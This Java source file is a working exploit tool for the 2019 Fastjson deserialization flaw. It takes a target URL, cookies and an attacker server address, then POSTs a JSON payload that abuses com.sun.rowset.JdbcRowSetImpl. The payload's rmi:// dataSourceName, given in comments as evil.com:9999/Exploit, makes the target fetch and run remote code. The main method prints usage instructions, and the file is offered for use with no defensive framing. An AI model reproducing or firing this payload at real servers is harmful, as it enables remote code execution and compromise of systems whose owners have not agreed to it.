import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;
import java.util.Map;

public class Rce2019Test {

    public static void payloadTest(String url,String serverAddr,String cookies) {
        PrintWriter out = null;
        BufferedReader in = null;
        if(cookies.equals("null")){
            try {
                //当没有cookie时报错
                URL accessUrl = new URL(url);
                URLConnection connTest = accessUrl.openConnection();
                Map<String, List<String>> headers = connTest.getHeaderFields();
                List<String> setCookie = headers.get("Set-Cookie");

                for (String str : setCookie) {
                    System.out.println(str.substring(0, str.indexOf(";") + 1));
                    cookies += str.substring(0, str.indexOf(";") + 1) + " ";
                }
            }catch (Exception e){
                //跳过
            }
        }
        try {
            URL realUrl = new URL(url);
            URLConnection conn = realUrl.openConnection();

            //设置头部信息
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36");
            conn.setRequestProperty("Cookie", cookies);
            //发送POST请求必须的两行代码
            conn.setDoOutput(true);
            conn.setDoInput(true);

            // 获取输出流
            out = new PrintWriter(conn.getOutputStream());
            //发送参数
            //String serverAddr = "evil.com:9999/Exploit"
            String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://" + serverAddr +"\",\"autoCommit\":true}}";
            out.print(payload);
            //flush 输出流
            out.flush();

            //读取服务器返回的内容
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            String resultContent = "";
            while ((line = in.readLine()) != null) {
                resultContent += line;
            }
            System.out.println(resultContent);
        } catch (Exception e) {
            System.out.println("发送 POST 请求出现异常！" + e);
            e.printStackTrace();
        }
        finally {
            try{
                if(out != null){
                    out.close();
                }
                if(in != null){
                    in.close();
                }
            }catch (IOException ex){
                ex.printStackTrace();
                System.out.println("输入输出流关闭异常：" + ex);
            }
        }

    }

    public static void main(String[] args){

        //String serverAddr = "evil.com:9999/Exploit"
        System.out.println("[+] e.g : fastjson-2019-Rce.jar http://attackServer/test/test/ payloadServer.com:port/Exploit cookies");
        System.out.println("[+] cookies value equal null is main no cookies");
        String url = args[0];
        String serverAddr = args[1];
        String cookies = args[2];
        payloadTest(url,serverAddr,cookies);
    }
}
